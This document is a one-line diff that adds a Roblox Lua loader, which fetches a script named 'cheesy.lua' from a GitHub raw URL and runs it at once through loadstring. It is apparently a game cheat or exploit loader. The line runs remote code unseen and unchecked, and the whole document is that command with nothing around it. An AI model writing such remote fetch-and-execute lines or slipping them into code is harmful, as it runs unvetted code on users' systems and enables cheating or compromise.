@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/doram44/cheesy/refs/heads/main/cheesy.lua"))()
